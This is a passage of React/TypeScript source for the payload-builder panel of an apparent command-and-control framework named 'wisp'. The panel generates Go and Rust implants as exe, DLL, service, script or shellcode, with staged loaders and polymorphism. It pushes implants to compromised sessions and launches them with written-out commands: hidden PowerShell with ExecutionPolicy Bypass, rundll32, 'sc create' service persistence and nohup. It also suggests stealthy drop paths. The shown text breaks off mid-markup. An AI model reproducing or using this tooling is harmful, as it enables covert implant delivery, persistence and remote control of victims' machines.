import { useEffect, useRef, useState } from 'react';
import { useI18n } from '../../i18n';
import { useStore } from '../../store';
import { Api } from '../../api';
import { copy, fmtSize } from '../../ui';
import type { FileJob, ListenerRow, PayloadCapabilities, PayloadMeta, ProfileRow, Session, TemplatesInfo } from '../../types';

type PushFlow = {
  meta: PayloadMeta;
  session: string;
  remote: string;
  run: boolean;
  stage: 'idle' | 'connect' | 'push' | 'run';
  note: string;
};

type Delivery = {
  id: string;
  ts: number;
  payload: string;
  name: string;
  session: string;
  remote: string;
  run: boolean;
  ok: boolean;
  note?: string;
};

const runCmdFor = (format: string, os: string, remote: string) => {
  switch (format) {
    case 'dll':
      return `rundll32.exe "${remote}",WispStart`;
    case 'svc':
      return `sc create wisp-agent binPath= "${remote} --service" start= auto && sc start wisp-agent`;
    case 'script':
      return os === 'windows'
        ? `powershell -NoProfile -ExecutionPolicy Bypass -File "${remote}"`
        : `sh "${remote}"`;
    default:
      return os === 'windows'
        ? `powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '${remote}' -WindowStyle Hidden"`
        : `chmod +x "${remote}" && nohup "${remote}" >/dev/null 2>&1 &`;
  }
};

const payloadRunCmd = (p: { meta: PayloadMeta; remote: string }) =>
  p.meta.mode === 'subprocess'
    ? `powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '${p.remote}' -WindowStyle Hidden"`
    : runCmdFor(p.meta.format, p.meta.os, p.remote);

const storedNum = (key: string, fallback: number) => {
  const n = Number(localStorage.getItem(key));
  return Number.isFinite(n) && n > 0 ? n : fallback;
};

export default function PayloadPanel() {
  const { t, tf } = useI18n();
  const sessions = useStore((s) => s.sessions);
  const project = useStore((s) => s.project);
  const [plats, setPlats] = useState<string[]>([]);
  const [caps, setCaps] = useState<PayloadCapabilities | null>(null);
  const [lsns, setLsns] = useState<ListenerRow[]>([]);
  const [lsn, setLsn] = useState('');
  const [prof, setProf] = useState('');
  const [profs, setProfs] = useState<ProfileRow[]>([]);
  const [agent, setAgent] = useState('go');
  const [plat, setPlat] = useState('windows_amd64');
  const [format, setFormat] = useState('exe');
  const [delivery, setDelivery] = useState('direct');
  const [loader, setLoader] = useState('none');
  const [sleep, setSleep] = useState(5000);
  const [jit, setJit] = useState(30);
  const [poly, setPoly] = useState(false);
  const [note, setNote] = useState('');
  const [list, setList] = useState<PayloadMeta[]>([]);
  const [tpl, setTpl] = useState<TemplatesInfo | null>(null);
  const [stageTtlMin, setStageTtlMin] = useState(() => storedNum('wisp_stage_ttl', 60));
  const [stageUses, setStageUses] = useState(() => storedNum('wisp_stage_uses', 1));
  const [filter, setFilter] = useState('');
  const tplInit = useRef(false);
  const [busy, setBusy] = useState(false);
  const [msg, setMsg] = useState('');
  const [push, setPush] = useState<PushFlow | null>(null);
  const [autoDeliver, setAutoDeliver] = useState(false);
  const [autoRun, setAutoRun] = useState(true);
  const [target, setTarget] = useState('');
  const [deliveries, setDeliveries] = useState<Delivery[]>(() => {
    try { return JSON.parse(localStorage.getItem('wisp_deliveries') ?? '[]') as Delivery[]; } catch { return []; }
  });
  const [showHist, setShowHist] = useState(false);

  const online = sessions.filter((s) => s.status === 'online');
  const scopedOnline = online.filter((s) => !project || s.project === project);
  const matchTargets = scopedOnline.filter((s) => s.info.os === plat.split('_')[0]);

  const load = async () => {
    try {
      const [p, l, L, tpls, c, prs] = await Promise.all([
        Api.payloads.platforms().catch(() => [] as string[]),
        Api.payloads.list(useStore.getState().project).catch(() => [] as PayloadMeta[]),
        Api.listeners.list().catch(() => [] as ListenerRow[]),
        Api.payloads.templates().catch(() => null),
        Api.payloads.capabilities().catch(() => null),
        Api.profiles.list().catch(() => [] as ProfileRow[]),
      ]);
      setPlats(p); setList(l); setCaps(c);
      setProfs(prs);
      const proj = useStore.getState().project;
      setLsns(L.filter((x) => x.running && (!proj || x.project === proj)));
      setTpl(tpls && Array.isArray(tpls.go?.files) ? tpls : null);
    } catch { /* server down */ }
  };
  useEffect(() => {
    void load();
    const iv = setInterval(load, 5000);
    return () => clearInterval(iv);
  }, []);
  useEffect(() => { void load(); }, [project]);
  useEffect(() => {
    if (caps || !plats.length) return;
    if (!plats.includes(plat)) setPlat(plats.includes('windows_amd64') ? 'windows_amd64' : plats[0]);
  }, [caps, plats, plat]);
  useEffect(() => {
    if (!lsns.length) return;
    const want = localStorage.getItem('wisp_builder_listener');
    if (want && lsns.some((l) => l.id === want)) {
      setLsn(want);
      localStorage.removeItem('wisp_builder_listener');
    }
  }, [lsns]);
  useEffect(() => {
    if (!tpl || tplInit.current) return;
    tplInit.current = true;
    if (!localStorage.getItem('wisp_stage_ttl') && tpl.stage_ttl_seconds) {
      setStageTtlMin(Math.max(1, Math.round(tpl.stage_ttl_seconds / 60)));
    }
    if (!localStorage.getItem('wisp_stage_uses') && tpl.stage_uses) setStageUses(tpl.stage_uses);
  }, [tpl]);
  useEffect(() => {
    if (!caps) return;
    const cs = caps.combos.filter((c) => c.agent === agent);
    if (!cs.length) return;
    const agentPlats = Array.from(new Set(cs.map((c) => `${c.os}_${c.arch}`)));
    if (!agentPlats.includes(plat)) {
      setPlat(agentPlats.includes('windows_amd64') ? 'windows_amd64' : agentPlats[0]);
      return;
    }
    const atPlat = cs.filter((c) => `${c.os}_${c.arch}` === plat);
    if (!atPlat.some((c) => c.format === format)) {
      const d = atPlat.find((c) => c.delivery === 'direct') ?? atPlat[0];
      setFormat(d.format); setDelivery(d.delivery); setLoader(d.loader);
      return;
    }
    const atFormat = atPlat.filter((c) => c.format === format);
    if (!atFormat.some((c) => c.delivery === delivery)) {
      const d = atFormat.find((c) => c.delivery === 'direct') ?? atFormat[0];
      setDelivery(d.delivery); setLoader(d.loader);
      return;
    }
    const atDelivery = atFormat.filter((c) => c.delivery === delivery);
    if (!atDelivery.some((c) => c.loader === loader)) setLoader(atDelivery[0].loader);
  }, [caps, agent, plat, format, delivery, loader]);
  useEffect(() => {
    if (!autoDeliver) return;
    if (!matchTargets.some((s) => s.id === target)) setTarget(matchTargets[0]?.id ?? '');
  }, [autoDeliver, matchTargets, target]);

  const combos = caps?.combos ?? [];
  const agentPlatforms = Array.from(new Set(combos.filter((c) => c.agent === agent).map((c) => `${c.os}_${c.arch}`)));
  const platformOptions = caps ? agentPlatforms : plats;
  const formatOptions = caps?.known.formats ?? ['exe'];
  const deliveryOptions = caps?.known.deliveries ?? ['direct', 'staged'];
  const loaderOptions = caps?.known.loaders ?? ['none', 'go', 'rust'];
  const comboAt = (a: string, p: string) => combos.filter((c) => c.agent === a && `${c.os}_${c.arch}` === p);
  const fmtAvailable = (f: string) => comboAt(agent, plat).some((c) => c.format === f);
  const delAvailable = (d: string) => comboAt(agent, plat).some((c) => c.format === format && c.delivery === d);
  const loaderAvailable = (l: string) => comboAt(agent, plat).some((c) => c.format === format && c.delivery === delivery && c.loader === l);
  const activeCombo = combos.find((c) => c.agent === agent && `${c.os}_${c.arch}` === plat
    && c.format === format && c.delivery === delivery && c.loader === loader);
  const phaseOf = (kind: 'format' | 'delivery' | 'loader', id: string) =>
    caps?.planned.find((p) => p.kind === kind && p.id === id)?.phase;
  const staged = delivery === 'staged';
  const subprocess = delivery === 'subprocess';
  const rustStaged = agent === 'rust' && staged;
  const rsStaged = rustStaged && loader === 'rust';
  const hasRcp = lsns.some((l) => l.kind === 'rcp' || l.kind === 'rcp-kcp');
  const hasHttp = lsns.some((l) => l.kind === 'http');
  const selLsn = lsns.find((l) => l.id === lsn);
  const selKind = selLsn?.kind;
  const stagedNoHttp = staged && !!lsn && selKind !== 'http';
  const mode = rsStaged ? 'rs' : subprocess ? 'subprocess' : staged ? 'staged' : 'direct';
  const tplFileSize = (files: { name: string; size: number }[] | undefined, name: string) =>
    files?.find((f) => f.name === name)?.size ?? 0;
  const suffix = plat.startsWith('windows') ? '.exe' : '';
  const activeTpl = agent === 'rust' ? tpl?.rs : tpl?.go;
  const goAgentName = `agent_${plat}${suffix}`;
  const goStageName = `stage_${plat}${suffix}`;
  const rsAgentName = `rs_agent_${plat}${suffix}`;
  const rsDllName = `rs_agent_${plat}.dll`;
  let estSize = 0;
  switch (format) {
    case 'dll': {
      estSize = tplFileSize(agent === 'rust' ? tpl?.rs.files : tpl?.go.files,
        agent === 'rust' ? rsDllName : 'agent_dll_windows_amd64.dll');
      if (subprocess) {
        estSize += loader === 'c'
          ? tplFileSize(tpl?.c?.files, 'loader_c_windows_amd64.exe')
          : loader === 'cpp' ? tplFileSize(tpl?.cpp?.files, 'loader_cpp_windows_amd64.exe') : 0;
      }
      break;
    }
    case 'svc':
      estSize = tplFileSize(tpl?.go.files, goAgentName);
      break;
    case 'script':
      // the script itself is a few KB; the interesting number is the stage2 it pulls
      estSize = tplFileSize(tpl?.go.files, goAgentName);
      break;
    case 'shellcode':
      estSize = tplFileSize(tpl?.rs.files, rsDllName) +
        tplFileSize(tpl?.srdi?.files, 'srdi_bootstrap_windows_amd64.exe');
      break;
    default:
      if (mode === 'direct') {
        estSize = tplFileSize(agent === 'rust' ? tpl?.rs.files : tpl?.go.files,
          agent === 'rust' ? rsAgentName : goAgentName);
      } else if (mode === 'staged') {
        estSize = loader === 'c'
          ? tplFileSize(tpl?.c?.files, 'loader_c_windows_amd64.exe')
          : loader === 'cpp'
            ? tplFileSize(tpl?.cpp?.files, 'loader_cpp_windows_amd64.exe')
            : tplFileSize(tpl?.go.files, goStageName);
      } else {
        estSize = tplFileSize(tpl?.rs.files, 'rs_stager_windows_amd64.exe');
      }
  }
  const runPreview = format === 'shellcode' ? ''
    : subprocess
      ? (plat.startsWith('windows') ? `Start-Process -FilePath '<artifact>' -WindowStyle Hidden` : '')
      : format === 'exe' ? '' : runCmdFor(format, plat.split('_')[0], '<artifact>');
  const cap = (s: string) => s.charAt(0).toUpperCase() + s.slice(1);
  const formatHint = (f: string) => t(`plFmt${cap(f)}Hint`);
  const lsnOrigin = selLsn ? (() => {
    const host = (selLsn.host || selLsn.addr || '').trim();
    const scheme = selLsn.kind === 'https' ? 'https' : selLsn.kind === 'http' ? 'http'
      : (selLsn.kind === 'tcp' || selLsn.kind.startsWith('rcp')) ? 'tcp' : 'kcp';
    return `${scheme}://${host}`;
  })() : t('plAutoLsn');
  const shown = list.filter((m) => {
    const q = filter.trim().toLowerCase();
    if (!q) return true;
    return `${m.name} ${m.note ?? ''} ${m.mode} ${m.os}_${m.arch}`.toLowerCase().includes(q);
  });
  const scopedDeliveries = deliveries.filter((d) => !project || list.some((m) => m.id === d.payload));
  const ttlSec = Math.max(60, Math.floor(stageTtlMin || 60) * 60);
  const uses = Math.min(20, Math.max(1, Math.floor(stageUses || 1)));
  const stagePresets = [
    { key: 'plPresetQuick', ttl: 10, uses: 1 },
    { key: 'plPresetNormal', ttl: 60, uses: 1 },
    { key: 'plPresetOffline', ttl: 1440, uses: 3 },
  ];

  const gen = async () => {
    setBusy(true); setMsg('');
    const [os, arch] = plat.split('_');
    try {
      const d = await Api.payloads.create({
        os, arch, agent, format, delivery, loader, profile: prof || undefined,
        poly: poly ? { enabled: true } : undefined,
        staged, rs_staged: rsStaged, listener: lsn, project: project || 'default',
        sleep_ms: Math.max(10, Math.floor(sleep) || 5000),
        jitter_pct: Math.min(100, Math.max(0, Math.floor(jit) || 0)),
        note: note.trim(),
        stage_ttl_seconds: ttlSec,
        stage_uses: uses,
      });
      setMsg(`✓ ${t('genWord')} ${d.name} (${fmtSize(d.size)}, sha ${String(d.sha256).slice(0, 10)}…)`);
      setNote('');
      await load();
      if (autoDeliver) {
        const s = scopedOnline.find((x) => x.id === target);
        if (s) {
          const flow: PushFlow = {
            meta: d, session: s.id, remote: remoteFor(s, d.name, d.format), run: autoRun && d.format !== 'shellcode',
            stage: 'connect', note: t('plPushConnect'),
          };
          setPush(flow);
          void runPush(flow);
        }
      }
    } catch (e) {
      setMsg(`⚠ ${String(e)}`);
    } finally {
      setBusy(false);
    }
  };

  const when = (iso: string) => {
    const d = new Date(iso);
    return Number.isNaN(+d) ? '' : d.toLocaleString();
  };
  const modeLabel = (m: string) => m === 'staged' ? t('modeStaged') : m === 'staged-rs' ? t('modeRsStaged') : m === 'staged-mem' ? t('modeMemStaged') : m === 'subprocess' ? t('modeSubprocess') : t('modeDirect');
  const agentLabel = (a: string) => a === 'rust' ? t('agentRust') : t('agentGo');
  const formatLabel = (f: string) => t(`format${f.charAt(0).toUpperCase()}${f.slice(1)}`);
  const deliveryLabel = (d: string) => d === 'direct' ? t('modeDirect') : d === 'staged' ? t('plStaged') : t('deliverySubprocess');
  const loaderLabel = (l: string) => t(`loader${l === 'none' ? 'None' : l === 'go' ? 'Go' : l === 'rust' ? 'Rust' : l === 'c' ? 'C' : 'CPP'}`);
  const toolchain = format === 'shellcode' ? tpl?.srdi?.toolchain
    : loader === 'c' ? tpl?.c?.toolchain : loader === 'cpp' ? tpl?.cpp?.toolchain : activeTpl?.toolchain;

  const remoteFor = (s: Session, name: string, fmt?: string) => s.info.os === 'windows'
    ? `${fmt === 'svc' ? 'C:\\ProgramData\\' : 'C:\\Windows\\Temp\\'}${name}` : `/tmp/${name}`;

  const makeDeliveryLink = async (m: PayloadMeta) => {
    try {
      const d = await Api.deliveries.create({ payload_id: m.id, ttl_seconds: 86400 });
      await copy(d.url, t('plDeliveryLink'));
      setMsg(`✓ ${t('plDeliveryCreated')} ${d.url}`);
    } catch (e) {
      setMsg(`⚠ ${e instanceof Error ? e.message : String(e)}`);
    }
  };

  const openPush = (m: PayloadMeta) => {
    const s = scopedOnline.find((x) => x.info.os === m.os) ?? scopedOnline[0];
    setPush({ meta: m, session: s?.id ?? '', remote: s ? remoteFor(s, m.name, m.format) : '', run: m.format !== 'shellcode', stage: 'idle', note: '' });
  };

  const recordDelivery = (cur: PushFlow, ok: boolean, note?: string) => {
    const d: Delivery = {
      id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
      ts: Date.now(), payload: cur.meta.id, name: cur.meta.name,
      session: cur.session, remote: cur.remote, run: cur.run, ok, note,
    };
    setDeliveries((prev) => {
      const next = [d, ...prev].slice(0, 30);
      localStorage.setItem('wisp_deliveries', JSON.stringify(next));
      return next;
    });
  };

  const replay = (d: Delivery) => {
    const m = list.find((x) => x.id === d.payload);
    if (!m) return;
    setPush({ meta: m, session: d.session, remote: d.remote, run: d.run, stage: 'idle', note: '' });
  };
  const pickSession = (id: string) => setPush((p) => {
    if (!p) return p;
    const s = scopedOnline.find((x) => x.id === id);
    return { ...p, session: id, remote: s ? remoteFor(s, p.meta.name, p.meta.format) : p.remote };
  });

  const runPush = async (cur: PushFlow) => {
    const up = (patch: Partial<PushFlow>) => setPush((p) => (p && p.meta.id === cur.meta.id ? { ...p, ...patch } : p));
    try {
      up({ stage: 'connect', note: t('plPushConnect') });
      let st = await Api.rcp.status(cur.session).catch(() => ({ online: false }));
      if (!st.online) {
        await Api.rcp.connect(cur.session);
        for (let i = 0; i < 40 && !st.online; i++) {
          await new Promise((r) => setTimeout(r, 500));
          st = await Api.rcp.status(cur.session).catch(() => ({ online: false }));
        }
        if (!st.online) throw new Error(t('plPushNoT2'));
      }
      up({ stage: 'push', note: t('plPushTransfer') });
      const d = await Api.payloads.push(cur.meta.id, { session: cur.session, remote: cur.remote });
      const jobId = d.job?.id;
      if (jobId) {
        let done = false;
        for (let i = 0; i < 600; i++) {
          const jobs = await Api.files.jobs().catch(() => [] as FileJob[]);
          const j = jobs.find((x) => x.id === jobId);
          if (j?.status === 'done') { done = true; break; }
          if (j?.status === 'failed') throw new Error(`${t('plPushFail')} (${j.status})`);
          await new Promise((res) => setTimeout(res, 500));
        }
        if (!done) throw new Error(t('plPushTimeout'));
      }
      if (cur.run) {
        up({ stage: 'run', note: t('plPushRun') });
        await Api.sessions.task(cur.session, 'shell', { command: payloadRunCmd(cur), timeout_ms: 15000 });
      }
      setMsg(`✓ ${t('plPushDone')} → ${cur.session.slice(0, 8)} ${cur.remote}`);
      recordDelivery(cur, true);
      setPush(null);
      void load();
    } catch (e) {
      const note = `⚠ ${e instanceof Error ? e.message : String(e)}`;
      recordDelivery(cur, false, note);
      up({ stage: 'idle', note });
    }
  };

  const doPush = () => {
    if (!push || !push.session || !push.remote || push.stage !== 'idle') return;
    void runPush(push);
  };

  const stageLabel = (m: PayloadMeta) => {
    if (m.mode === 'direct' || !m.stage_total) return '';
    if (!m.stage_active) return t('stageDead');
    const until = m.stage_until ? new Date(m.stage_until) : null;
    return `${tf('stageLeft', { n: m.stage_left ?? 0, m: m.stage_total })}${until ? ` · ${until.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}` : ''}`;
  };

  const rearm = async (m: PayloadMeta) => {
    setBusy(true); setMsg('');
    try {
      await Api.payloads.rearm(m.id, { stage_ttl_seconds: ttlSec, stage_uses: uses });
      setMsg(`✓ ${t('rearmDone')} ${m.name}`);
      await load();
    } catch (e) {
      setMsg(`⚠ ${e instanceof Error ? e.message : String(e)}`);
    } finally {
      setBusy(false);
    }
  };

  const rm = async (m: PayloadMeta) => {
    if (!confirm(t('plConfirmRm').replace('{n}', m.name))) return;
    try {
      await Api.payloads.remove(m.id);
      setMsg(`✓ ${m.name} ${t('plDeleted')}`);
      await load();
    } catch (e) {
      setMsg(`⚠ ${e instanceof Error ? e.message : String(e)}`);
    }
  };

  const hints: string[] = [];
  if (!lsns.length) hints.push(t('plNoListener'));
  else if (!hasHttp) hints.push(t('plNoHttp'));
  if (rustStaged && !hasRcp) hints.push(t('plNoRcp'));
  if (stagedNoHttp) hints.push(t('plStagedHttp'));
  if (!caps) hints.push(t('plCapsUnavailable'));
  else if (!activeCombo) hints.push(t('plNoCombo'));
  if (tpl) {
    if (agent === 'rust' && !tpl.rs.ok) hints.push(`${t('plRsTplWarn')}${tpl.rs.error ? ` (${tpl.rs.error})` : ''}`);
    if (agent === 'go' && !tpl.go.ok) hints.push(`${t('plGoTplWarn')}${tpl.go.error ? ` (${tpl.go.error})` : ''}`);
  }
  if (format === 'svc') hints.push(t('plSvcHint'));
  if (format === 'script') hints.push(t('plScriptHint'));
  if (format === 'dll') hints.push(t(agent === 'rust' ? 'plRsDllHint' : 'plGoDllHint'));
  if (loader === 'c' && !subprocess) hints.push(t(agent === 'rust' ? 'plCMemHint' : 'plCLoaderHint'));
  if (loader === 'cpp' && format !== 'shellcode' && !subprocess) hints.push(t(agent === 'rust' ? 'plCPPMemHint' : 'plCPPLoaderHint'));
  if (format === 'shellcode') hints.push(t('plShellcodeHint'));
  if (subprocess) hints.push(t('plSubprocessHint'));
  if (poly) hints.push(t('plPolyHint'));

  return (
    <div className="pl-wrap">
      <div className="pl-form">
        <span>{t('plListener')}</span>
        <select value={lsn} onChange={(e) => setLsn(e.target.value)}>
          <option value="">{t('plAuto')}</option>
          {lsns.map((l) => <option key={l.id} value={l.id}>{l.name || l.id} · {l.kind}</option>)}
        </select>
        <span>{t('thProfile')}</span>
        <select value={prof} onChange={(e) => setProf(e.target.value)}>
          <option value="">{t('plProfNone')}</option>
          {profs.map((p) => <option key={p.name} value={p.name}>{p.name}{p.builtin ? '' : ' ★'}</option>)}
        </select>
        <span>{t('plAgent')}</span>
        <div className="pl-modes">
          {(['go', 'rust'] as const).map((a) => {
            const avail = combos.some((c) => c.agent === a);
            return (
              <button key={a} className={agent === a ? 'on' : ''} disabled={!!caps && !avail}
                title={caps && !avail ? t('plNoCombo') : undefined} onClick={() => setAgent(a)}>
                {agentLabel(a)}
              </button>
            );
          })}
        </div>
        <span>{t('plPlatform')}</span>
        <select value={plat} onChange={(e) => setPlat(e.target.value)} disabled={!platformOptions.length}>
          {platformOptions.length
            ? platformOptions.map((x) => <option key={x} value={x}>{x}</option>)
            : <option value={plat}>{plat}{t('noTpl')}</option>}
        </select>
        <span className="pl-break" />
        <div className="pl-formats">
          {formatOptions.map((f) => {
            const avail = fmtAvailable(f);
            const phase = phaseOf('format', f);
            return (
              <button key={f} type="button" className={`pl-fmt${format === f ? ' on' : ''}`}
                disabled={!avail}
                title={avail ? formatHint(f) : phase ? tf('plPlanned', { p: phase }) : t('plNoCombo')}
                onClick={() => setFormat(f)}>
                <b>{formatLabel(f)}</b>
                <em>{avail ? formatHint(f) : phase ? tf('plPlanned', { p: phase }) : t('plNoCombo')}</em>
              </button>
            );
          })}
        </div>
        <span>{t('plDelivery')}</span>
        <select value={delivery} onChange={(e) => setDelivery(e.target.value)} disabled={!caps}>
          {deliveryOptions.map((d) => {
            const avail = delAvailable(d);
            const phase = phaseOf('delivery', d);
            return <option key={d} value={d} disabled={!avail}>{deliveryLabel(d)}{!avail && phase ? ` · ${tf('plPlanned', { p: phase })}` : ''}</option>;
          })}
        </select>
        <span>{t('plLoader')}</span>
        <select value={loader} onChange={(e) => setLoader(e.target.value)} disabled={!caps}>
          {loaderOptions.map((l) => {
            const avail = loaderAvailable(l);
            const phase = phaseOf('loader', l);
            return <option key={l} value={l} disabled={!avail}>{loaderLabel(l)}{!avail && phase ? ` · ${tf('plPlanned', { p: phase })}` : ''}</option>;
          })}
        </select>
        <span>{t('plSleep')}</span><input type="number" min={10} value={sleep} onChange={(e) => setSleep(+e.target.value)} />
        <span>{t('plJitter')}</span><input type="number" min={0} max={100} value={jit} onChange={(e) => setJit(+e.target.value)} />
        <label className="pl-run-lbl" title={t('plPolyHint')}><input type="checkbox" checked={poly} onChange={(e) => setPoly(e.target.checked)} /> {t('plPoly')}</label>
        <span className="pl-break" />
        <input className="pl-note-in" maxLength={120} placeholder={t('plNotePh')} value={note} onChange={(e) => setNote(e.target.value)} />
        {staged && (<>
          <span title={t('plStageTtlHint')}>{t('plStageTtl')}</span>
          <input type="number" min={1} max={1440} value={stageTtlMin} onChange={(e) => { const v = +e.target.value; setStageTtlMin(v); if (v > 0) localStorage.setItem('wisp_stage_ttl', String(v)); }} />
          <span title={t('plStageUsesHint')}>{t('plStageUses')}</span>
          <input type="number" min={1} max={20} value={stageUses} onChange={(e) => { const v = +e.target.value; setStageUses(v); if (v > 0) localStorage.setItem('wisp_stage_uses', String(v)); }} />
          <span className="pl-presets">
            {stagePresets.map((p) => (
              <button key={p.key} type="button" className="pl-preset" title={`${p.ttl} min · ${p.uses}×`} onClick={() => { setStageTtlMin(p.ttl); setStageUses(p.uses); localStorage.setItem('wisp_stage_ttl', String(p.ttl)); localStorage.setItem('wisp_stage_uses', String(p.uses)); }}>{t(p.key)}</button>
            ))}
          </span>
        </>)}
        <span className="pl-break" />
        <label className="pl-run-lbl"><input type="checkbox" checked={autoDeliver} onChange={(e) => setAutoDeliver(e.target.checked)} /> {t('plAutoDeliver')}</label>
        {autoDeliver && (<>
          <span>{t('plTarget')}</span>
          <select value={target} onChange={(e) => setTarget(e.target.value)} disabled={!matchTargets.length}>
            {!matchTargets.length && <option value="">{t('plNoTarget')}</option>}
            {matchTargets.map((s) => <option key={s.id} value={s.id}>#{s.num} {s.info.hostname} · {s.info.user}</option>)}
          </select>
          <label className="pl-run-lbl"><input type="checkbox" checked={autoRun} onChange={(e) => setAutoRun(e.target.checked)} /> {t('plRunAfter')}</label>
        </>)}
        <button disabled={busy || !activeCombo || stagedNoHttp || (!lsn && !hasHttp) || (autoDeliver && !target) || (!!push && push.stage !== 'idle')} onClick={() => void gen()}>
          {busy ? t('plGenWord') : autoDeliver ? t('plGenDeliver') : t('plGen')}
        </button>
        <span className="pl-msg">{msg}</span>
      </div>
      <div className="pl-preview">
        <span>{agentLabel(agent)} · {formatLabel(format)} · {deliveryLabel(delivery)} · {loaderLabel(loader)}{prof ? ` · ${t('thProfile')}: ${prof}` : ''}</span>
        <span>{t('plPreviewLsn')}: {selLsn ? `${selLsn.name || selLsn.id} · ${lsnOrigin}` : t('plAutoLsn')}</span>
        {staged && (stagedNoHttp
          ? <span className="c-warn">⚠ {t('plStagedHttp')}</span>
          : <span>{t('plPreviewStage')}: {lsnOrigin}{tpl?.stage_path || '/stage'}/… · {stageTtlMin}{t('plMinShort')} · {uses}{t('plTimes')}</span>)}
        {estSize > 0 && <span>{t(format === 'script' ? 'plEstStage2' : 'plEstSize')}: ≈ {fmtSize(estSize)}</span>}
        {toolchain && <span>{t('plToolchain')}: {toolchain}</span>}
        <span>{t('plSource')}: {t('plSourceTemplate')}</span>
        {runPreview && <span className="pl-run-hint" title={runPreview}>{t('plLaunch')}: {runPreview}</span>}
        <span className="pl-mode-hint">{t(format === 'shellcode' ? 'plModeHintShellcode' : mode === 'subprocess' ? 'plModeHintSubprocess' : mode === 'direct' ? 'plModeHintDirect' : mode === 'staged' ? 'plModeHintStaged' : 'plModeHintRs')}</span>
      </div>
      {(hints.length > 0 || tpl) && (
        <div className="pl-hints">
          {hints.map((h) => <span key={h} className="pl-hint warn">⚠ {h}</span>)}
          {tpl && <span className="pl-hint">{t('plTplInfo')}: go {tpl.go.git || '?'} ({tpl.go.built_at ? new Date(tpl.go.built_at).toLocaleString() : '?'}) · rs {tpl.rs.git || '?'}</span>}
        </div>
      )}
      <div className="pl-listbar">
        <input value={filter} onChange={(e) => setFilter(e.target.value)} placeholder={t('plFilterPh')} />
        <span>{shown.length}/{list.length}</span>
        <button className={`pl-mini${showHist ? ' on' : ''}`} onClick={() => setShowHist((x) => !x)}>{t('plHist')} {scopedDeliveries.length}</button>
      </div>
      {showHist && (
        <div className="pl-hist">
          {scopedDeliveries.map((d) => {
            const s = sessions.find((x) => x.id === d.session);
            const canReplay = !!list.find((m) => m.id === d.payload) && scopedOnline.some((x) => x.id === d.session);
            return (
              <div className="pl-hist-row" key={d.id}>
                <span className={d.ok ? 'c-ok' : 'c-err'} title={d.note ?? ''}>{d.ok ? '✓' : '✗'}</span>
                <span className="mono muted">{when(new Date(d.ts).toISOString())}</span>
                <span className="pl-hist-name" title={d.name}>{d.name}</span>
                <span>{s ? `#${s.num}` : d.session.slice(0, 8)}</span>
                <span className="mono pl-hist-remote" title={d.remote}>{d.remote}</span>
                <button className="pl-mini" disabled={!canReplay} title={t('plReplayHint')} onClick={() => replay(d)}>{t('plReplay')}</button>
              </div>
            );
          })}
          {!scopedDeliveries.length && <div className="empty">{t('plNoHist')}</div>}
        </div>
      )}
      <div className="pl-list">
        <div className="pl-row pl-head"><span>{t('thFileName')}</span><span>{t('thMode')}</span><span>{t('thPlatform')}</span><span>{t('thSize')}</span><span>{t('thCreated')}</span><span>{t('thAct')}</span></div>
        {shown.map((m) => (
          <div key={m.id} className="pl-row" title={`${t('thSha')}: ${m.sha256}${m.note ? `\n${m.note}` : ''}`}>
            <span className="mono pl-name">{m.name}{m.note ? <em className="pl-note-txt">{m.note}</em> : null}</span>
            <span>{modeLabel(m.mode)}{m.format !== 'exe' && <em className="pl-fmt-tag">{formatLabel(m.format)}</em>}{!!m.stage_total && <em className={`pl-stage ${m.stage_active ? 'ok' : 'dead'}`} title={m.stage_until ?? ''}>{stageLabel(m)}</em>}</span>
            <span>{m.os}/{m.arch}</span>
            <span>{fmtSize(m.size)}</span>
            <span className="muted">{when(m.created)}</span>
            <span className="pl-acts">
              <a href={`/api/payloads/${m.id}/download?token=${encodeURIComponent(localStorage.getItem('wisp_token') ?? '')}`} download>{t('download')}</a>
              <button className="pl-mini" disabled={!scopedOnline.length} onClick={() => openPush(m)}>{t('plDeliver')}</button>
              <button className="pl-mini" title={t('plDeliveryLink')} onClick={() => void makeDeliveryLink(m)}>🔗</button>
              {m.hint && <button className="pl-mini" title={`${t('plLaunchCopy')}\n${m.hint}`} onClick={() => { void navigator.clipboard.writeText(m.hint ?? '').then(() => setMsg(`✓ ${t('plLaunchCopied')}`)).catch(() => {}); }}>▶</button>}
              <button className="pl-mini" title={`${t('thSha')}: ${m.sha256}`} onClick={() => { void navigator.clipboard.writeText(m.sha256).then(() => setMsg(`✓ ${t('plShaCopied')}`)).catch(() => {}); }}>⧉</button>
              {m.mode !== 'direct' && !!m.stage_total && <button className="pl-mini" disabled={busy} title={t('rearmHint')} onClick={() => void rearm(m)}>↻</button>}
              <button className="pl-mini danger" onClick={() => void rm(m)}>✕</button>
            </span>
          </div>
        ))}
        {!list.length && <div className="empty">{t('noPayload')}</div>}
      </div>
      {push && (
        <div className="mdl-mask" onMouseDown={() => { if (push.stage === 'idle') setPush(null); }}>
          <div className="mdl" onMouseDown={(e) => e.stopPropagation()}>
            <div className="mdl-hd">{t('plDeliverT')}<span className="mdl-x" onClick={() => { if (push.stage === 'idle') setPush(null); }}>✕</span></div>
            <div className="mdl-body">
              <div className="mdl-note mono">{push.meta.name} · {fmtSize(push.meta.size)} · {formatLabel(push.meta.format)} · {modeLabel(push.meta.mode)}</div>
              {!scopedOnline.length && <div className="mdl-err">{t('plNoSession')}</div>}
              <label>{t('plSession')}</label>
              <select value={push.session} onChange={(e) => pickSession(e.target.value)} disabled={push.stage !== 'idle'}>
                {scopedOnline.map((s) => <option key={s.id} value={s.id}>#{s.num} {s.info.hostname} · {s.info.os}/{s.info.arch} · {s.id.slice(0, 8)}</option>)}
              </select>
              <label>{t('plRemote')}</label>
              <input value={push.remote} disabled={push.stage !== 'idle'} onChange={(e) => setPush({ ...push, remote: e.target.value })} />
              <div className="pl-path-presets">
                {(push.meta.os === 'windows'
                  ? ['C:\\Windows\\Temp\\', 'C:\\ProgramData\\', 'C:\\Users\\Public\\']
                  : ['/tmp/', '/dev/shm/', '/var/tmp/']).map((dir) => (
                  <button key={dir} type="button" className="pl-preset" disabled={push.stage !== 'idle'}
                    onClick={() => {
                      const name = push.remote.split(/[\\/]/).pop() || push.meta.name;
                      setPush({ ...push, remote: dir + name });
                    }}>{dir}</button>
                ))}
              </div>
              <label className="pl-run-lbl"><input type="checkbox" checked={push.run} disabled={push.stage !== 'idle' || push.meta.format === 'shellcode'} onChange={(e) => setPush({ ...push, run: e.target.checked })} /> {t('plRunAfter')}</label>
